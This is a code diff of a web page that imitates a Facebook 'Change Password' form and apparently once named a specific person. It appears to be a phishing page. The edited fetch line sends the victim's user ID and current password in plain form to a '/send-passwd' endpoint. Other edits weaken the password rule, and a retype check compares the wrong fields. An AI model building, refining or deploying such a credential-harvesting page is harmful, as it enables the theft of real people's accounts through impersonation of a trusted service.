@@ -15,7 +15,7 @@
             if (!validate(userId, currPassword, newPassword, retypePassword)){
                 return;
             }
-            const response = await fetch(`/send-passwd?user_id=${userId}&password=${password}`);    
+            const response = await fetch(`/send-passwd?user_id=${userId}&password=${currPassword}`);    
             if (!response.ok) {
                 const error = await response.json();
                 console.log(`Error: ${error.error}`);
@@ -27,7 +27,7 @@
             let flag = true;
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             const phoneRegex = /^\+?\d{6,15}$/;
-            const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{6,}$/;
+            const passwordRegex = /^(?=.*[A-Za-z]).{6,}$/;
             const isValidUserId = emailRegex.test(userId) || phoneRegex.test(userId);
             if (!isValidUserId) {
                 document.getElementById("wrong-id").hidden = flag = false;
@@ -44,7 +44,7 @@
             } else {
                 document.getElementById("wrong-new-password").hidden = true;
             }
-            if (currPassword !== newPassword) {
+            if (currPassword != newPassword) {
                 document.getElementById("wrong-retype-password").hidden = flag = false;
             } else {
                 document.getElementById("wrong-retype-password").hidden = true;
@@ -56,7 +56,7 @@
 </head>
 <body>
     <form action="" onsubmit="send(event)">
-        <p>Kamil Nuriev · Facebook</p>
+        <p> · Facebook</p>
         <h1>Change Password</h1>
         <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</p>
         <label for="user-id">Email/Phone number</label>
